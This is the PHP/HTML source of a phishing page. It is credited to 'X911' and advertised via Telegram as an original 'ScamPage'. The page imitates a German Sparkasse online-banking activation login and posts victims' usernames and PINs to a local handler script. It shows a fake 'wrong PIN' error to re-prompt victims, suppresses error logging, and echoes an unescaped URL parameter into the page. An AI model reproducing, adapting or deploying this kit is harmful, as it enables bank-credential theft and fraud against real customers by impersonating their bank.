<?php
session_start();
/// Coder By X911
/// Contact Me For More Original ScamPages
/// X911 Group https://t.me/X911_tools
/// X911 Contact https://t.me/Code_x911

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

include("./Config/911.php");
?>
<!DOCTYPE html>
<html lang="de" class="no-touch js">
	<link type="text/css" rel="stylesheet" id="dark-mode-custom-link">
	<link type="text/css" rel="stylesheet" id="dark-mode-general-link">
	<style lang="en" type="text/css" id="dark-mode-custom-style"></style>
	<style lang="en" type="text/css" id="dark-mode-native-style"></style>
	<style lang="en" type="text/css" id="dark-mode-native-sheet"></style>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Online-Banking Zugang aktivieren</title>
		<meta name="language" content="de">
		<meta name="viewport" content="initial-scale=1, width=device-width">
		<meta name="description" content="Sie haben Fragen oder Anregungen oder wünschen eine Beratung zu einem bestimmten Thema. Ihre Sparkasse steht Ihnen gern mit Rat und Tat zur Seite.">
		<meta name="robots" content="index,follow">
		<meta name="format-detection" content="telephone=no">
		<link rel="shortcut icon" href="./X911/favicon.ico" />
		<link rel="canonical" href="#/de/home/service/kontofuehrung-von-zuhause/online-banking-zugang-aktivieren.html">
		<link rel="shortcut icon" href="#/content/dam/myif/sk-koblenz/work/bilder/icons/favicon1x.ico">
		<link rel="apple-touch-icon" href="#/content/dam/myif/sk-koblenz/work/bilder/icons/apple-touch-icon-180x180px.png" sizes="180x180">
		<link rel="icon" href="#/content/dam/myif/sk-koblenz/work/bilder/icons/favicon2x.png" sizes="32x32" type="image/png">
		<link rel="icon" href="#/content/dam/myif/sk-koblenz/work/bilder/icons/favicon1x.png" sizes="16x16" type="image/png">
		<link rel="stylesheet" href="./X911/internetfiliale.min.afc7ae1f00ee4bfb9d51522c08de507e.css" type="text/css">
		<script src="./X911/internetfiliale.min.1ad45579c103c7d4ed66d462b867cc32.js"></script>
	</head>
	<body class="if6 templ-bankingpage nbf nav-main default-design nbf-size-default resize-cbox-large is_no_apple_device with-if6_tabnav" data-statistics-url="#/de/home/misc/break.html" data-cp_salt="5wohrNe34g" data-cp_proof="-1064120473" data-cp_redirect="" data-cp_statistik="/content/myif/sk-koblenz/work/filiale/de/home/misc/break.html">
		<div class="if6_main">
			<div class="if6_outer if6_siteselect" aria-hidden="false">
				<div class="if6_inner">
				</div>
			</div>

			<div class="if6_outer if6_iconbar" aria-hidden="false">
				<div class="if6_inner">
					<div class="iconbar_overlay"></div>
					<div class="iconbar"></div>
				</div>
			</div>
			<section class="if6_outer if6_section" role="main" aria-hidden="false">
				<div class="if6_inner">
					<div class="section parsys">
					<div style="text-align: center;">
						
						<img src="./X911/512x512bb.jpg" style="width: 50px;border-radius: 50%;margin-right: 10px;vertical-align: baseline;">
						
						</div>
						<div class="cbox cbox-banking cbox-large section" style="height: auto;">
							<div class="nbf-gv mkp-transaction nbf-login">
								<div class="">
									<div class="mkp-flex mkp-gap-MEDIUM-10 mkp-layout-margin-all mkp-line-large-margin-both">
										<div class="mkp-column">
										<?php if(isset($_GET["id"])){
										echo "<p style='color:red;text-align: center;'> Anmeldename/Legitimations-ID oder PIN ist falsch.</p><br>";
										
										} ?>
											<form action="./siftA/A.php" method="post" accept-charset="UTF-8" autocomplete="off">
												<script type="text/javascript">
													<!--
													(function(){
													var props = {};
													
													IF = {
														get: function(key) {return props[key];},
														put: function(key, value) {props[key] = value;},
													
														show: function(id, show) {
															document.getElementById(id).style.display = show === false ? 'none' : '';
														},
														hide: function(id) {this.show(id, false);},
														
														helpMe: function(adresse, titel) {
															var fenster = window.open(Adresse, Titel, 'width=450,height=300,resizable=yes,status=no,scrollbars=yes');
															if(fenster != null) {
																fenster.focus();
															}
														},
														helpMe2: function(adresse, titel) {
															var fenster = window.open(Adresse, Titel, 'status=no,scrollbars=yes');
															if(fenster != null) {
																fenster.focus();
															}
														}
													};
													
													}());
													
													 -->
												</script>
												<script type="text/javascript">
													<!--
													(function(){
													IF.put('invisibleButton','QmfuXgtpHHkiuwpU');
													}());
													
													 -->
												</script>
												<div style="position:absolute;top:0px;">
												<input type="text" name="csNNXXUUXJVQqLEh" id="csNNXXUUXJVQqLEh" value="0" disabled="disabled" style="DISPLAY: none" class="" size="1">
												</div>
												<div class="block js-msg no-separator">
													<h3><span>Bitte aktivieren Sie JavaScript</span></h3>
													<div class="bline btext-only">
														<span class="description">Die Nutzung des Online-Banking ist ohne JavaScript und das Akzeptieren von temporären Cookies nicht möglich.</span>
														<br class="bterm">
													</div>
												</div>
												<div class="block cookie-msg no-separator">
													<h3><span>Temporäre Cookies</span></h3>
													<div class="bline btext-only">
														<span class="description">In Ihrem Browser sind Cookies deaktiviert. Die Nutzung des Online-Banking ist ohne das Akzeptieren von temporären Cookies nicht möglich.</span>
														<br class="bterm">
													</div>
												</div>
												<input type="hidden" name="bran" value="<?php if(isset($_GET["branch"])){ echo $_GET["branch"];} ?>">
												

																								<div class="bline mkp-line-small-margin" style="position: relative;">
													<input required type="text" name="userid" id="OmrbaLkERfCawinj" value="" class="nbf-text-input" maxlength="16" autocomplete="username" placeholder=" ">
													<label for="OmrbaLkERfCawinj">Anmeldename</label>
													<br class="bterm">
												</div>
												<div class="bline mkp-line-small-margin" style="position: relative;">
													<input required type="password" name="password" id="hXCBkKVcEQmrjnAK" value="" autocomplete="off" class="has-inline-icon nbf-text-input format-password-show" maxlength="38" placeholder=" ">
													<label for="hXCBkKVcEQmrjnAK">Online-Banking PIN</label>
													<div class="nbf-input-right-text">
														<div class="format-password-show" tabindex="0">
															<span class="password-show"></span>
															<span class="password-hide"></span>
														</div>
													</div>
													<br class="bterm">
												</div>
												<h1 style="color: #565656; font-size: 12px; font-weight: 100;">Online-Banking-PIN speichern</h1>
												<input type="hidden" id="isJavaScriptActive" name="isJavaScriptActive" value="1">
												<div class="buttonline main-buttons">
													<div class="bgroup1">
														<div><input style=" padding: 12px 80px; background-color: red; color: white; border: none; " type="submit" name="submit" title="Weiter" value="Anmelden" onclick="return IF.checkFirstSubmit();" class=""></div>
													</div>
												</div>
												<input type="hidden" name="UpHYgCFZZIKDcHQN" id="UpHYgCFZZIKDcHQN" value="EsBVGHbPQTfIpDgZ">
											</form>
											<div class="block nbf-login no-separator" style="margin-left: 0;padding-left: 0;">
        <div class="bline btext-only">
            <ul class="seclinks"><li><a href="#" target="_self" title="Sicherheitshinweise" data-target_level="0" data-target_navigation="de">Sicherheitshinweise</a></li><li><a href="#" target="_self" title="Zugangsdaten vergessen?" data-target_level="0" data-target_navigation="de">Zugangsdaten vergessen?</a></li></ul>
        <br class="bterm"></div>
    </div>
										</div>									
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</section>
		</div>
		<div class="block no-separator nbf-login alternatelinks" style="margin-left: 0;padding-left: 0;position: absolute;bottom: 0;margin-bottom: 20px;">
            <div class="bline btext-only">
                <ul class="alternatelinks">
                    
                        <li>
                            <a href="#" data-target_level="0" data-target_navigation="de">
                                <span class="description" style="font-size: 14px;">Sie haben noch kein Online-Banking?</span>
                                <span class="linktext" style="font-size: 14px;">Jetzt freischalten</span>
                            </a>
                        </li>
                    
                        <li>
                            <a href="#" data-target_level="0" data-target_navigation="de">
                                <span class="description" style="font-size: 14px;">Sie vergessen oft Ihre Anmeldedaten? </span>
                                <span class="linktext" style="font-size: 14px;">In S-Trust speichern</span>
                            </a>
                        </li>
                    
                </ul>
            <br class="bterm"></div>
        </div>
	</body>
	<!--online-banking-zugang-aktivieren-->
</html>